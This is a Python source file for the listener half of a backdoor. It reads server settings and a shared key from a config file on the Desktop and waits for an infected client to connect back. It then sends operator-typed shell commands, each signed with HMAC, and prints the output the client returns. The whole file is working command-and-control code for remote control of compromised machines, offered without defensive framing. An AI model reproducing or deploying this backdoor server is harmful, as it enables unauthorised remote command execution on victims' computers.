import socket
import sys
import configparser
import os
import hmac
import hashlib

config_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'config.ini')
config = configparser.ConfigParser()
config.read(config_path)

HOST = config['Server']['address']
PORT = int(config['Server']['port'])
BUFFER = int(config['Format']['buffer'])
SEP = "<sep>"
SECRET_KEY = config['Authentication']['key']

def generate_hmac(command):
    return hmac.new(
        SECRET_KEY.encode(),
        command.encode(),
        hashlib.sha256
    ).hexdigest()

def backdoor_comms(conn):
    try:
        cwd = conn.recv(BUFFER).decode()
        print(f"[+] Connection established from {addr[0]}:{addr[1]}")
        print("[+] Type 'exit' to close the connection")
        
        while True:
            command = input("").strip()
            
            if command.lower() == 'exit':
                print("[*] Closing connection...")
                break
            
            # Generate HMAC for the command
            command_hmac = generate_hmac(command)
            
            # Send command and HMAC together
            message = command + SEP + command_hmac
            conn.send(message.encode())
            
            output = conn.recv(BUFFER).decode()
            
            try:
                results, cwd = output.split(SEP)
                print(results)
            except ValueError:
                print(output)
                
    except ConnectionResetError:
        print("[-] Connection was reset by the client")
    except Exception as exception:
        print(f"[-] Error in communication: {str(exception)}")
    finally:
        conn.close()

def main():
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_sock.bind((HOST, PORT))
        except socket.error as exception:
            print(f"[-] Bind failed: {str(exception)}")
            sys.exit()
            
        print(f"[+] Listening on {HOST}:{PORT}")
        server_sock.listen(1)
        
        while True:
            try:
                global addr
                conn, addr = server_sock.accept()
                backdoor_comms(conn)
            except KeyboardInterrupt:
                print("\n[-] Server shutdown requested")
                break
            except Exception as exception:
                print(f"[-] Error accepting connection: {str(exception)}")
                continue
            
    except Exception as exception:
        print(f"[-] Server error: {str(exception)}")
    finally:
        if 'server_sock' in locals():
            server_sock.close()
        print("[*] Server shutdown complete")

if __name__ == "__main__":
    main()
